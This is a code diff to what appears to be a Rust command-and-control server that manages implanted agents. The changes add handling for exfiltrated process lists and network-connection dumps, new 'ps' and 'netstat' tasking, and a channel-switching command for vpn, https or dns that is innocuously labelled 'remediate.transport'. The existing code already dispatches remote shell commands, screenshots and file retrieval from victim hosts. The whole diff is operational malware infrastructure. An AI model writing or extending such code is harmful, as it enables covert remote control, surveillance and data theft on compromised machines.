@@ -268,17 +268,18 @@ fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, 
                 if let Some(obj_end) = msgs_json[pos..].find('}') {
                     let obj = &msgs_json[pos..pos + obj_end + 1];
 
-                    // Check if this is a shell output message (has "output" field instead of "chunk")
-                    if obj.contains("\"file\"") && obj.contains("\"output\"") && obj.contains("shell_output") {
-                        if let Some(output_b64) = json_str(obj, "output") {
-                            if let Some(decoded) = base64_decode(&output_b64) {
-                                // Store shell output as a file
-                                match store_download_chunk(&dl_store, &agent_id, "shell_output.txt", 0, decoded) {
-                                    Ok(()) => {
-                                        eprintln!("[*] Shell output received from {} ({} bytes)", agent_id, output_b64.len());
-                                    }
-                                    Err(e) => {
-                                        eprintln!("[!] Failed to store shell output for ({}): {}", agent_id, e);
+                    // Check if this is a command output message (has "output" field instead of "chunk")
+                    // Handles: shell_output.txt, ps_output.txt, netstat_output.txt
+                    if obj.contains("\"file\"") && obj.contains("\"output\"") {
+                        if let Some(file_field) = json_str(obj, "file") {
+                            if let Some(output_b64) = json_str(obj, "output") {
+                                if let Some(decoded) = base64_decode(&output_b64) {
+                                    // Store command output as a file
+                                    match store_download_chunk(&dl_store, &agent_id, &file_field, 0, decoded) {
+                                        Ok(()) => { /* File stored successfully */ }
+                                        Err(e) => {
+                                            eprintln!("[!] Failed to store output {} from ({}): {}", file_field, agent_id, e);
+                                        }
                                     }
                                 }
                             }
@@ -292,9 +293,7 @@ fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, 
                                     // Extract offset if present (for multi-chunk reassembly)
                                     let offset = json_u64(obj, "offset");
                                     match store_download_chunk(&dl_store, &agent_id, &file_field, offset, decoded) {
-                                        Ok(()) => {
-                                            // Chunk stored successfully
-                                        }
+                                        Ok(()) => { /* Chunk stored successfully */ }
                                         Err(e) => {
                                             eprintln!("[!] Failed to store chunk for {} ({}): {}", file_field, agent_id, e);
                                         }
@@ -351,8 +350,14 @@ fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, 
                         ("upload", payload.clone())  // JSON payload = upload command
                     } else if payload == "screenshot" {
                         ("screenshot", payload.clone())  // Screenshot command
+                    } else if payload == "ps" {
+                        ("ps", payload.clone())  // Process list command
+                    } else if payload == "netstat" {
+                        ("netstat", payload.clone())  // Network connections command
                     } else if payload.starts_with("shell:") {
                         ("shell", payload[6..].to_string())  // Shell command (strip "shell:" prefix)
+                    } else if payload == "vpn" || payload == "https" || payload == "dns" {
+                        ("remediate.transport", payload.clone())  // Transport switch command
                     } else {
                         ("file-recv", payload.clone())  // Plain path = file-recv command
                     };
